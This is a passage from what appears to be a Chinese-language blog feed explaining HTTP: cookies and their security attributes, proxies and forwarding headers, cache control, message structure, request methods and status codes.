src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/6a6d30a89fb085d5f1773a887aaf5572.png"></p><h2 id="Cookie-机制"><a href="#Cookie-机制" class="headerlink" title="Cookie 机制"></a>Cookie 机制</h2><p>HTTP 协议是 <strong>无状态</strong> 的，这既是优点也是缺点。优点是服务器没有状态差异，可以很容易地组成集群，而缺点是无法支持需要记录状态的事务操作。好在 HTTP 协议是可扩展的，通过 Cookie 技术，就给 HTTP 增加了 “记忆能力”。</p><blockquote><p>目前虽然已经出现了多种 Local Web Storage 技术，能够比 Cookie 存储更多的数据，但 Cookie 仍然是最通用、兼容性最强的客户端数据存储手段。</p></blockquote><h3 id="Cookie-的工作流程"><a href="#Cookie-的工作流程" class="headerlink" title="Cookie 的工作流程"></a>Cookie 的工作流程</h3><p>Cookie 的传递要用到两个字段，分别是响应头字段 <strong>Set-Cookie</strong> 和请求头字段 <strong>Cookie</strong>，这个过程如下所示：</p><ol><li>当用户通过浏览器第一次访问服务器的时候，服务器不知道他的身份，会创建一个独特的身份标识数据，格式是 <strong>Set-Cookie: key=value</strong>，随着响应报文一同发给浏览器。</li><li>浏览器收到响应报文，看到里面有 Set-Cookie，知道这是服务器给的身份标识，于是就保存起来，下次再请求的时候就自动把这个值放进 Cookie 字段里发给服务器，格式是 <strong>Cookie: key=value</strong>。</li><li>因为第二次请求里面有了 Cookie 字段，服务器就可以拿到 Cookie 里的值，识别出用户的身份，然后提供个性化的服务。</li></ol><blockquote><p>服务器有时会在响应头里添加多个 Set-Cookie，存储多个 “key=value”，但浏览器这边发送时不需要用多个 Cookie 字段，只要在一行中用 “;” 隔开就行。</p><p>Cookie 是由浏览器负责存储的，而不是操作系统，所以它只能在本浏览器内生效。</p></blockquote><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/9f6cca61802d65d063e24aa9ca7c38a4.png"></p><h3 id="Cookie-的属性"><a href="#Cookie-的属性" class="headerlink" title="Cookie 的属性"></a>Cookie 的属性</h3><p>常见的 Cookie 属性可以分为三类：</p><ul><li><p><strong>生存周期：</strong>即 Cookie 的有效期，限制 Cookie 只能在一段时间内可用，可以使用 <strong>Expires</strong> 和 <strong>Max-Age</strong> 两个属性来设置。Expires 使用绝对时间，可以理解为是截止日期；Max-Age 使用相对时间，单位为秒，表示浏览器收到报文后经过的时间。</p><blockquote><p>如果不指定 Expires 或 Max-Age 属性，那么 Cookie 仅在浏览器运行时有效，一旦关闭浏览器就会失效，这也被称为 <strong>会话Cookie（session cookie）</strong>。</p></blockquote></li><li><p><strong>作用域：</strong>让浏览器仅把 Cookie 发送给特定的服务器和 URI，避免被其他网站盗用。作用域的设置比较简单，使用 <strong>Domain</strong> 和 <strong>Path</strong> 指定 Cookie 所属的域名和路径，浏览器在发送 Cookie 前会从 URI 中提取出 host 和 path 部分，对比 Cookie 的属性。如果不满足条件，就不会在请求头里发送 Cookie。</p><blockquote><p>使用这两个属性可以为不同的域名和路径分别设置各自的 Cookie，比如 “/19-1” 用一个 Cookie，“/19-2” 再用另外一个 Cookie，两者互不干扰。不过现实中为了省事，通常 Path 就用一个 “/” 表示或者直接省略，表示域名下的任意路径都允许使用 Cookie，让服务器自己去挑。</p></blockquote></li><li><p><strong>安全性：</strong>尽量不要让用户和服务器以外的人获取到 Cookie 的内容，在 Cookie 中有三个与安全相关的属性。</p><ul><li><strong>HttpOnly</strong> 属性会告诉浏览器，此 Cookie 只能通过浏览器 HTTP 协议传输，禁止其他方式访问，浏览器的 JS 引擎就会禁用 document.cookie 等一切相关的 API，可以缓解 XSS 跨站脚本攻击。</li><li><strong>SameSite</strong> 属性可以防范 CSRF 跨站请求伪造攻击，设置成 <code>SameSite=Strict</code> 可以严格限定 Cookie 不能随着跳转链接跨站发送，而 <code>SameSite=Lax</code> 则略微宽松一点，允许 GET/HEAD 等安全方法，但禁止 POST 跨站发送。</li><li><strong>Secure</strong> 属性表示这个 Cookie 仅能用 HTTPS 协议加密传输，明文的 HTTP 协议会禁止发送。但 Cookie 本身不是加密的，浏览器里还是以明文的形式存在。</li></ul></li></ul><h3 id="Cookie-的应用"><a href="#Cookie-的应用" class="headerlink" title="Cookie 的应用"></a>Cookie 的应用</h3><p>Cookie 最基本的一个用途就是 <strong>身份识别</strong>，保存用户的登录信息，实现会话事务。</p><p>比如，你用账号和密码登录某电商，登录成功后网站服务器就会发给浏览器一个 Cookie，内容大概是 “name=yourid”，这样就成功地把身份标签贴在了你身上。</p><p>之后你在网站里随便访问哪件商品的页面，浏览器都会自动把身份 Cookie 发给服务器，所以服务器总会知道你的身份，一方面免去了重复登录的麻烦，另一方面也能够自动记录你的浏览记录和购物下单，实现了 “状态保持”。</p><p>Cookie 的另一个常见用途是 <strong>广告跟踪</strong>。</p><p>比如，上网的时候肯定看过很多的广告图片，这些图片背后都是广告商网站（例如 Google），它会 “偷偷地” 给你贴上 Cookie 小纸条，这样你上其他的网站，别的广告就能用 Cookie 读出你的身份，然后做行为分析，再推给你广告。</p><p>这种 Cookie 不是由访问的主站存储的，所以又叫 <strong>第三方 Cookie（third-party cookie）</strong>。如果广告商势力很大，广告到处都是，那么就比较恐怖了，无论你走到哪里它都会通过 Cookie 认出你来，实现广告的 “精准打击”。</p><p>为了防止滥用 Cookie 搜集用户隐私，互联网组织相继提出了 DNT（Do Not Track）和 P3P（Platform for Privacy Preferences Project），但实际作用不大。</p><h2 id="代理服务"><a href="#代理服务" class="headerlink" title="代理服务"></a>代理服务</h2><p><strong>代理（Proxy）</strong> 是 HTTP 协议中请求方和应答方中间的一个环节，所谓 “代理服务” 就是指 <strong>服务本身不生产内容，而是处于中间位置转发上下游的请求和响应，具有双重身份</strong>：面向下游的用户时，表现为服务器，代表源服务器进行响应；而面向上游的源服务器时，又表现为客户端，代表客户端发送请求。 </p><p>代理有很多的种类，常见的有：</p><ol><li>匿名代理：完全 “隐匿” 了被代理的机器，外界看到的只是代理服务器。</li><li>透明代理：在传输过程中是 “透明开放” 的，外界既知道代理，也知道客户端。</li><li>正向代理：靠近客户端，代表客户端向服务器发送请求。</li><li>反向代理：靠近服务器，代表服务器响应客户端的请求。</li></ol><p>现在无处不在的 <strong>内容分发网络（CDN，Content Delivery Network）</strong>，实际上就是一种代理（缓存代理），它代替源站服务器响应客户端的请求，通常扮演着透明代理和反向代理的角色。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/28237ef93ce0ddca076d2dc19c16fdf9.png"></p><h3 id="代理的作用"><a href="#代理的作用" class="headerlink" title="代理的作用"></a>代理的作用</h3><p>由于代理处在 HTTP 通信过程的中间位置，对上屏蔽了真实客户端，对下屏蔽了真实服务器，所以在这个中间环节就可以做很多有意思的事情，为 HTTP 协议增加更多的灵活性。</p><p>代理最基本的一个功能就是 <strong>负载均衡</strong>：把访问请求均匀分散到多台机器，实现访问集群化。因为在面向客户端时屏蔽了源服务器，客户端看到的只是代理服务器，源服务器究竟有多少台、是哪些 IP 地址都不知道，真正由哪台服务器来响应请求完全由代理服务器决定。</p><p>在负载均衡的同时，代理服务还可以执行更多的功能，比如：</p><ul><li><strong>健康检查</strong>：使用 “心跳” 等机制监控后端服务器，发现有故障就及时 “踢出” 集群，保证服务高可用。</li><li><strong>安全防护</strong>：隐匿源站 IP，使用 WAF 等工具抵御网络攻击，以及限制 IP 访问或流量过载，保护被代理的后端服务器。</li><li><strong>加密卸载</strong>：对外网使用 SSL/TLS 加密通信认证，而在安全的内网不加密，省去加解密成本。</li><li><strong>数据处理</strong>：提供压缩、加密、修改上下行数据等功能。</li><li><strong>内容缓存</strong>：暂存、复用服务器响应，减轻后端的压力。</li></ul><h3 id="代理字段"><a href="#代理字段" class="headerlink" title="代理字段"></a>代理字段</h3><p>代理的好处很多，但因为它 “欺上瞒下” 的特点，隐藏了真实客户端和服务器，如果双方想要获得这些被隐藏的原始信息，该怎么办呢？</p><p>首先，代理服务器需要用 <strong>Via</strong> 字段 <strong>标明代理的身份</strong>。Via 是一个通用字段，请求头或响应头里都可以出现。每当报文经过一个代理节点，代理服务器就会把自身的信息追加到字段的末尾，就像是经手人盖了一个章。</p><p>例如下图中有两个代理：proxy1 和 proxy2，客户端发送请求会经过这两个代理，依次添加就是 <strong>Via: proxy1, proxy2</strong>，等到服务器返回响应报文的时候就要反过来，依次是 <strong>Via: proxy2, proxy1</strong>。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/52a3bd760584972011f6be1a5258e2d7.png"></p><p>Via 字段只解决了客户端和源服务器判断是否存在代理的问题，还不能知道对方的真实信息。但服务器的 IP 地址应该是保密的，关系到企业的内网安全，所以一般不会让客户端知道。不过反过来，通常服务器需要知道客户端的真实 IP 地址，方便做访问控制、用户画像、统计分析。</p><p>可惜的是 HTTP 标准里并没有为此定义头字段，但已经出现了很多 “事实上的标准”，最常用的两个头字段是 <strong>X-Forwarded-For</strong> 和 <strong>X-Real-IP</strong>。</p><p>X-Forwarded-For（XFF）的字面意思是 “为谁而转发”，形式上和 Via 差不多，也是每经过一个代理节点就会在字段里追加一个信息。但 Via 追加的是 <strong>代理主机名</strong>（或者域名），而 X-Forwarded-For 追加的是 <strong>请求方的 IP 地址</strong>。所以，在 X-Forwarded-For 字段里最左边的 IP 就是客户端的地址。此外还有两个字段：X-Forwarded-Host 和 X-Forwarded-Proto，分别记录客户端请求的原始域名和原始协议名。</p><p>X-Real-IP 是另一种获取客户端真实 IP 的手段，它的作用很简单，就是记录 <strong>客户端 IP 地址</strong>，没有中间的代理信息，相当于是 X-Forwarded-For 的简化版。如果客户端和源服务器之间只有一个代理，那么这两个字段的值就是相同的。</p><h3 id="代理协议"><a href="#代理协议" class="headerlink" title="代理协议"></a>代理协议</h3><p>有了 X-Forwarded-For 等头字段，源站就可以拿到准确的客户端信息了，但对于代理服务器来说它并不是一个最佳的解决方案。</p><p>因为通过 X-Forwarded-For 操作代理信息必须要解析 HTTP 报文头，这对于代理来说成本比较高，原本只需要简单地转发消息就好，而现在却必须要费力解析数据再修改数据，会降低代理的转发性能；另一个问题是 X-Forwarded-For 等头必须要修改原始报文，而有些情况下是不允许甚至不可能的（比如使用 HTTPS 加密通信）。</p><p>所以就出现了一个专门的 <strong>代理协议（PROXY protocol）</strong>，可以在不改动原始报文的情况下传递客户端的真实 IP。它由知名的代理软件 HAProxy 定义，也是一个被广泛采用的 “事实标准”（并不是 RFC），目前有 v1（明文格式）和 v2（二进制格式）两个版本。</p><p> v1 会在 HTTP 报文前增加了一行 ASCII 码文本，相当于又多了一个头，格式形如：<code>PROXY TCP4 1.1.1.1 2.2.2.2 55555 80\r\n</code>。服务器看到这样的报文，只要解析第一行就可以拿到客户端地址，不需要再去理会后面的 HTTP 数据，省了很多事情。</p><h2 id="缓存控制"><a href="#缓存控制" class="headerlink" title="缓存控制"></a>缓存控制</h2><p><strong>缓存（Cache）</strong>是计算机领域里的一个重要概念，是 <strong>优化系统性能</strong> 的重要手段。</p><p>由于链路漫长，网络时延不可控，浏览器使用 HTTP 获取资源的成本较高。所以，非常有必要把来之不易的数据缓存起来，下次再请求的时候尽可能地复用。这样，就可以避免多次 “请求-应答” 的通信成本，节约网络带宽，也可以加快响应速度。</p><p>实际上，HTTP 传输的 <strong>每一个环节</strong> 基本上都会有缓存，非常复杂。基于 “请求-应答” 模式的特点，可以大致分为客户端缓存和服务器端缓存。</p><blockquote><p>没有请求的请求，才是最快的请求。</p></blockquote><h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><p>缓存控制的运行机制实际上和 Cookie 机制十分相似，在传递中使用了 <strong>Cache-Control</strong> 头字段，这个过程如下所示：</p><ol><li>浏览器请求一个资源，发现缓存中没有数据，于是发送请求，向服务器获取资源；</li><li>服务器响应请求，返回资源，同时标记资源的有效期，格式是 <strong>Cache-Control: max-age=30</strong>；</li><li>浏览器缓存资源，等待下次重用。</li></ol><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/a1968821f214df4a3ae16c9b30f99a5b.png"></p><p>max-age 是 HTTP 缓存控制最常用的属性，作用和 Cookie 类似，不过时间的计算起点是响应报文的 <strong>创建时间</strong>（即 Date 字段），此外在 Cache-Control 里还可以设置其他属性来更精确地指示浏览器如何使用缓存：</p><ul><li>no_store：<strong>不允许缓存</strong>，用于某些变化非常频繁的数据，例如秒杀页面。</li><li>no_cache：<strong>可以缓存</strong>，但在 <strong>使用缓存前</strong> 必须去服务器验证是否过期，是否有最新的版本（等同于 max-age=0,must-revalidate）。</li><li>must-revalidate：<strong>可以缓存</strong>，如果缓存不过期就可以继续使用，如果 <strong>缓存失效</strong> 则必须去服务器验证。</li></ul><p>其实不止服务器可以发 Cache-Control 响应头，浏览器也可以发送 Cache-Control 请求头，也就是说 “请求-应答” 的双方都可以用这个字段进行缓存控制，<strong>互相协商</strong> 缓存的使用策略。</p><p>当使用 F5 刷新按钮的时候，浏览器会在请求头里加一个 <strong>Cache-Control: max-age=0</strong>，此时不使用缓存，直接向服务器发送请求。服务器看到 max-age=0，也会生成一个最新报文回应浏览器；使用 Ctrl+F5 强制刷新时，会发送 <strong>Cache-Control: no-cache</strong>，含义和 max-age=0 基本一样，依赖于后端服务器怎么理解，通常两者的效果是相同的。</p><p>只有在 “前进” “后退” “跳转” 这些重定向动作中，浏览器的缓存才会真正生效。此时请求头中不再有 Cache-Control，在响应码后会有 “from disk cache” 字样，表示没有发送网络请求，而是读取磁盘上的缓存。</p><h3 id="条件请求"><a href="#条件请求" class="headerlink" title="条件请求"></a>条件请求</h3><p>由于浏览器在使用缓存前往往需要去服务器验证缓存是否为最新，这个验证动作可以用两个连续的请求完成：先发一个 HEAD，获取资源的修改时间等元信息，然后与缓存数据比较，如果没有改动就使用缓存；否则就再发一个 GET 请求，获取最新的版本。</p><p>但这样的两个请求网络成本太高了，所以 HTTP 协议就定义了一系列 <strong>If</strong> 开头的 <strong>条件请求</strong> 字段，专门用来检查验证资源是否过期，把两个请求才能完成的工作合并为一个请求。并且，缓存是否过期的验证逻辑也在服务器中完成。</p><p>条件请求一共有 5 个头字段，我们最常用的是 <strong>If-Modified-Since</strong> 和 <strong>If-None-Match</strong> 这两个。使用条件请求需要服务器在第一次的响应报文中提供 <strong>Last-modified</strong> 或 <strong>ETag</strong> 字段，然后浏览器在接下来的条件请求中就可以带上这个字段值，验证资源是否是最新的。如果资源没有变，服务器就回应一个 <strong>304 Not Modified</strong>，表示缓存依然有效，浏览器就可以更新一下有效期，然后放心大胆地使用缓存了。</p><p>Last-modified 很好理解，就是文件的最后修改时间。ETag 是 <strong>实体标签（Entity Tag）</strong>的缩写，<strong>是资源的一个唯一标识</strong>，用于精确地识别资源的变动情况，解决修改时间无法准确区分文件变化的问题。比如，一个文件在一秒内修改了多次，但因为修改时间是秒级，所以这一秒内的新版本无法区分；再比如，一个文件定期更新，但有时会是同样的内容，实际上没有变化，用修改时间就会误以为发生了变化，传送给浏览器就会浪费带宽。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/b239d0804be630ce182e24ea9e4ab237.png"></p><h3 id="缓存代理"><a href="#缓存代理" class="headerlink" title="缓存代理"></a>缓存代理</h3><p>缓存代理也就是支持缓存控制的代理服务，是服务器端的缓存技术。</p><p>在没有缓存的时候，代理服务器每次都是直接转发客户端和服务器的报文，中间不会存储任何数据，只有最简单的中转功能。</p><p>加入了缓存后，代理服务会把源服务器发来的响应报文转发给客户端，同时把报文存入自己的 Cache 里。下一次再有相同的请求，代理服务器就可以直接发送 304 或者缓存数据，不必再从源服务器那里获取。这样就降低了客户端的等待时间，同时节约了源服务器的网络带宽。 </p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/5e8d10b5758685850aeed2a473a6cdc2.png"></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
      <tag>Cookie</tag>
      
      <tag>Proxy</tag>
      
      <tag>Cache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>透视 HTTP 协议（一）</title>
    <link href="/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="报文结构"><a href="#报文结构" class="headerlink" title="报文结构"></a>报文结构</h2><p>HTTP 协议的请求报文和响应报文的结构基本相同，由三大部分组成：</p><ol><li>起始行（start line）：描述请求或响应的基本信息；</li><li>头部字段集合（header）：使用 key-value 形式更详细地说明报文，是由 ASCII 编码的 <strong>纯文本</strong> 数据；</li><li>消息正文（entity）：实际传输的数据，它不一定是纯文本，可以是图片、视频等二进制数据。</li></ol><p>其中前两部分经常被合称为 <strong>header</strong>，消息正文被称为 <strong>body</strong>。</p><p>HTTP 协议规定报文必须有 header，但可以没有 body，而且在 header 之后必须要有一个 <strong>空行</strong>，也就是 <code>CRLF</code>（十六进制 0x0D0A）。所以，一个完整的 HTTP 报文就是下图的这个样子：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/62e061618977565c22c2cf09930e1d3c.png"></p><h2 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h2><p><strong>请求行（request line）</strong>简要地描述了 <strong>客户端想要如何操作服务器端的资源</strong>，它由三部分构成：</p><ol><li>请求方法：是一个动词，如 GET/POST，表示对资源的操作；</li><li>请求目标：通常是一个 URI，标记了请求方法要操作的资源；</li><li>版本号：表示报文使用的 HTTP 协议版本。</li></ol><p>这三个部分通常使用空格（space）分隔，最后用 CRLF 换行表示结束。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/36108959084392065f36dff3e12967b9.png"></p><h2 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h2><p><strong>状态行（status line）</strong>描述了 <strong>服务器响应的状态</strong>，它由三部分构成：</p><ol><li>版本号：表示报文使用的 HTTP 协议版本；</li><li>状态码：一个三位数，用代码的形式表示服务器处理的结果；</li><li>原因：作为数字状态码补充，是更详细的解释文字，帮助理解原因。</li></ol><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/a1477b903cd4d5a69686683c0dbc3300.png"></p><h2 id="头部字段"><a href="#头部字段" class="headerlink" title="头部字段"></a>头部字段</h2><p>请求行或状态行再加上头部字段集合就构成了 HTTP 报文里完整的 <strong>请求头</strong> 或 <strong>响应头</strong>，除了起始行不同，请求头和响应头的结构是基本一样的。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/1fe4c1121c50abcf571cebd677a8bdea.png"></p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/cb0d1d2c56400fe9c9988ee32842b175.png"></p><p>头部字段是 <code>key-value</code> 的形式，key 和 value 之间用 <code>:</code> 分隔，最后用 <code>CRLF</code> 换行表示字段结束。比如在 Host: 127.0.0.1 这一行里，key 就是 Host，value 就是 127.0.0.1。</p><p>使用头字段需要注意下面几点：</p><ol><li>字段名 <strong>不区分大小写</strong>，例如 Host 也可以写成 host，但首字母大写的可读性更好；</li><li>字段名 <strong>不允许出现空格</strong>，可以使用连字符 <code>-</code>，但不能使用下划线 <code>_</code>；</li><li>字段名后面必须紧接着 <code>:</code> 不能有空格，字段值前可以有多个空格；</li><li>字段的顺序不影响语义，可以任意排列；</li><li>字段原则上 <strong>不能重复</strong>，除非这个字段本身的语义允许，例如 Set-Cookie。</li></ol><blockquote><p>HTTP 头部字段非常灵活，不仅可以使用标准里的 Host、Connection 等已有头，也可以任意添加自定义头，这就给 HTTP 协议带来了无限的扩展可能。</p><p>虽然 HTTP 协议对 header 的大小没有做限制，但各个 Web 服务器都不允许过大的请求头，因为头部太大可能会占用大量的服务器资源，影响运行效率。</p></blockquote><h2 id="常用头字段"><a href="#常用头字段" class="headerlink" title="常用头字段"></a>常用头字段</h2><p>HTTP 协议规定了非常多的头部字段，以实现各种各样的功能，但基本上可以分为四大类：</p><ol><li>通用字段：在请求头和响应头里都可以出现；</li><li>请求字段：仅能出现在请求头里，补充说明请求信息或者额外的附加条件；</li><li>响应字段：仅能出现在响应头里，补充说明响应报文的信息；</li><li>实体字段：实际上属于通用字段，但专门描述 body 的额外信息。</li></ol><blockquote><p>对 HTTP 报文的解析和处理实际上主要就是对头字段的处理，理解了头字段也就理解了 HTTP 报文。</p></blockquote><h3 id="通用字段"><a href="#通用字段" class="headerlink" title="通用字段"></a>通用字段</h3><ul><li><strong>Date</strong>：表示 HTTP 报文创建的时间，通常出现在响应头里，客户端可以使用这个时间再搭配其他字段决定缓存策略。</li></ul><h3 id="请求字段"><a href="#请求字段" class="headerlink" title="请求字段"></a>请求字段</h3><ul><li><strong>Host</strong>：是 HTTP/1.1 规范里唯一要求 <strong>必须出现</strong> 的字段，用于告诉服务器这个请求应该由哪个主机来处理。当一台计算机上托管了多个虚拟主机的时候，服务器端就需要用 Host 字段来选择，类似简单的“路由重定向”。</li><li><strong>User-Agent</strong>：使用一个字符串来描述发起 HTTP 请求的客户端，服务器可以依据它来返回最合适此浏览器显示的页面。</li><li><strong>Referer</strong>：表示当前请求页面的来源页面的地址（注：referer 实际上是 referrer 的误拼写），服务端一般使用 <code>Referer</code> 请求头识别访问来源，可用于统计分析、日志记录以及缓存优化、防盗链等。与之相关的还有一个 <strong>Referrer Policy</strong>，用于控制 <code>Referer</code> 请求头的内容。</li></ul><h3 id="响应字段"><a href="#响应字段" class="headerlink" title="响应字段"></a>响应字段</h3><ul><li><strong>Server</strong>：告诉客户端当前正在提供 Web 服务的软件名称和版本号，这个字段不是必须出现的。因为会暴露服务器的信息，有可能被黑客利用，所以有的网站响应头中要么没有这个字段，要么就给出一个完全无关的描述信息。</li><li><strong>Location</strong>：表示该网页的跳转地址，一般在 3xx 的重定向响应中使用。</li><li>X-Powered-By：非标准字段，用于告知服务器端使用的编程语言。</li></ul><h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/3cdc8ac71b80929f4a94dfeb9ffe4b6d.jpg"></p><h3 id="标准方法"><a href="#标准方法" class="headerlink" title="标准方法"></a>标准方法</h3><p>目前 HTTP/1.1 规定了八种方法，方法名称必须是 <strong>大写形式</strong>：</p><ol><li>GET：从服务器获取资源；</li><li>HEAD：从服务器获取资源的元信息，即“响应头”，是轻量化的 GET；</li><li>POST：向服务器提交数据，通常表示“新建”；</li><li>PUT：向服务器提交数据，通常表示“修改”，功能类似 POST；</li><li>DELETE：要求服务器删除资源；</li><li>CONNECT：要求服务器为客户端和另一台远程服务器建立一条特殊的连接隧道，这时 Web 服务器在中间充当了代理的角色；</li><li>OPTIONS：要求服务器列出可对资源实行的操作方法，在响应头的 Allow 字段里返回；它的功能很有限，用处也不大，有的服务器（例如 Nginx）干脆就没有实现对它的支持；</li><li>TRACE：多用于对 HTTP 链路的测试或诊断，可以追踪请求 - 响应的传输路径；它的本意是好的，但存在漏洞，会泄漏网站的信息，所以 Web 服务器通常也是禁止使用。</li></ol><h3 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h3><p>虽然 HTTP/1.1 里规定了八种请求方法，但它并没有限制我们只能用这八种方法，这也体现了 HTTP 协议良好的扩展性，我们可以任意添加请求动作，只要请求方和响应方都能理解就行。</p><p>例如在 WebDAV 中就对 HTTP/1.1 进行了扩展，添加了 MKCOL、COPY、MOVE、LOCK、UNLOCK、PATCH 等方法。如果有合适的场景，你也可以把它们应用到自己的系统里，比如用 LOCK 方法锁定资源暂时不允许修改，或者使用 PATCH 方法给资源打个小补丁，部分更新数据。但因为这些方法是非标准的，所以需要为客户端和服务器编写额外的代码才能支持。</p><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><strong>状态码（Status Code）</strong> 在响应报文里表示了服务器对请求的处理结果。目前 RFC 标准里规定的状态码由三位十进制数字组成，并分为了五类，用数字的第一位表示类别，0~99 不用。因此，状态码的实际可用范围在 <strong>100~599</strong>。</p><p>这五类状态码的具体含义是：</p><ul><li>1××：<strong>提示信息</strong>，表示目前是协议处理的中间状态，还需要后续的操作，实际用到的场景很少；</li><li>2××：<strong>成功</strong>，表示服务器已经收到并成功处理了客户端的请求报文；</li><li>3××：<strong>重定向</strong>，表示客户端请求的资源位置发生变动，需要客户端重新发送请求获取资源；</li><li>4××：<strong>客户端错误</strong>，表示客户端发送的请求报文有误，服务器无法处理；</li><li>5××：<strong>服务器错误</strong>，表示服务器在处理请求时发生了内部错误，无法返回应有的响应数据。</li></ul><p>在 HTTP 协议中，正确地理解并应用这些状态码不是客户端或服务器单方的责任，而是双方共同的责任。</p><p>目前 RFC 标准里总共有 <strong>41 个</strong> 状态码，但状态码的定义是开放的，<strong>允许自行扩展</strong>。所以 Apache、Nginx 等 Web 服务器都定义了一些专有的状态码。如果你自己开发 Web 应用，也完全可以在不冲突的前提下定义新的代码。</p><h3 id="1××"><a href="#1××" class="headerlink" title="1××"></a>1××</h3><ul><li>101 Switching Protocols：表示客户端使用 Connection: upgrade 字段，要求在 HTTP 协议的基础上改成其他的协议继续通信，比如 WebSocket、HTTP/2，如果服务器也同意变更协议，就会发送状态码 101 切换协议。</li></ul><h3 id="2××"><a href="#2××" class="headerlink" title="2××"></a>2××</h3><ul><li><p><strong>200 OK</strong>：是最常见的成功状态码，表示一切正常，服务器如客户端所期望的那样返回了处理结果。如果是非 HEAD 请求，通常在响应头后都会有 body 数据。</p></li><li><p><strong>204 No Content</strong>：是另一个很常见的成功状态码，它的含义与 200 OK 基本相同，但响应头后没有 body 数据。所以对于 Web 服务器来说，正确地区分 200 和 204 是很有必要的。</p></li><li><p><strong>206 Partial Content</strong>：是 HTTP 分块下载或断点续传的基础，在客户端发送“范围请求”、要求获取资源的部分数据时出现。它与 200 一样，也是服务器成功处理了请求，但 body 里的数据不是资源的全部，而是其中的一部分。</p><blockquote><p>响应码 206 通常会伴随着头字段 <strong>Content-Range</strong>，表示响应报文里 body 数据的具体范围，供客户端确认。例如：Content-Range: bytes 0-99/2000，表示此次获取的是总计 2000 个字节的前 100 个字节。</p></blockquote></li></ul><h3 id="3××"><a href="#3××" class="headerlink" title="3××"></a>3××</h3><ul><li><p><strong>301 Moved Permanently</strong>：俗称 <strong>永久重定向</strong>，表示请求的资源已经不存在了，以后的请求都必须改用新的 URI。</p></li><li><p><strong>302 Found / Moved Temporarily</strong>：俗称 <strong>临时重定向</strong>，表示请求的资源还在，但是暂时不可用，需要用另一个 URI 来访问。</p><blockquote><p>301 和 302 都会在响应头里使用 <strong>Location</strong> 字段指明后续要跳转的 URI，可以用绝对或相对的形式，最终的效果很相似，浏览器都会重定向到新的 URI。两者的根本区别在于语义，一个是 “永久”，一个是 “临时”，所以在场景、用法上差距很大。</p><p>比如，你的网站升级到了 HTTPS，原来的 HTTP 不打算用了，这就是 “永久” 的，所以要配置 301 跳转，把所有的 HTTP 流量都切换到 HTTPS，搜索引擎的爬虫看到 301 就会更新索引库，不再使用老的 URI；再比如，今晚网站后台要系统维护，服务暂时不可用，这就属于 “临时” 的，可以配置成 302 跳转，把流量临时切换到一个静态通知页面，浏览器看到这个 302 就知道这只是暂时的情况，不会做缓存优化，第二天还会访问原来的地址。</p></blockquote></li><li><p><strong>304 Not Modified</strong>：用于在 If-Modified-Since 等条件请求中，进行 <strong>缓存控制</strong>，表示资源未修改。它不具有通常的跳转含义，但可以理解为 “重定向到已缓存的文件”（即缓存重定向）。</p></li><li><p>307 Temporary Redirect：与 302 状态码意义相同，唯一区别在于，当发送重定向请求时，307 状态码可以确保请求方法和消息主体不会发生变化。</p></li></ul><h3 id="4××"><a href="#4××" class="headerlink" title="4××"></a>4××</h3><ul><li><strong>400 Bad Request</strong>：通用错误码，表示客户端请求报文有错误，但具体是数据格式错误、缺少请求头还是 URI 超长都没有明确说，只是一个笼统的错误，客户端看到只会是一头雾水。在开发 Web 应用时应当尽量避免给客户端返回 400，而是要用其他更有明确含义的状态码。</li><li>401 Authorization Required：未授权，当前请求需要用户验证。</li><li><strong>403 Forbidden</strong>：实际上不是客户端的请求出错，而是表示服务器禁止访问资源。原因可能多种多样，例如信息敏感、法律禁止等，如果服务器友好一点，可以在 body 里详细说明拒绝请求的原因。</li><li><strong>404 Not Found</strong>：原意是资源在请求的服务器上未找到，所以无法提供给客户端。但现在已经被用滥了，只要服务器“不高兴”就可以给出个 404，而我们也无从得知后面到底是真的未找到，还是有什么别的原因。</li><li>405 Method Not Allowed：不允许使用某些方法操作资源，例如不允许 POST 只能 GET；</li><li>406 Not Acceptable：资源无法满足客户端请求的条件，例如请求中文但只有英文；</li><li>408 Request Timeout：请求超时，服务器等待了过长的时间；</li><li>409 Conflict：多个请求发生了冲突，可以理解为多线程并发时的竞态；</li><li>413 Request Entity Too Large：请求报文里的 body 太大；</li><li>414 Request-URI Too Long：请求行里的 URI 太大；</li><li>416 Requested Range Not Satisfiable：所请求的范围无法满足；</li><li>429 Too Many Requests：客户端发送了太多的请求，通常是由于服务器的限连策略；</li><li>431 Request Header Fields Too Large：请求头某个字段或总体太大；</li></ul><h3 id="5××"><a href="#5××" class="headerlink" 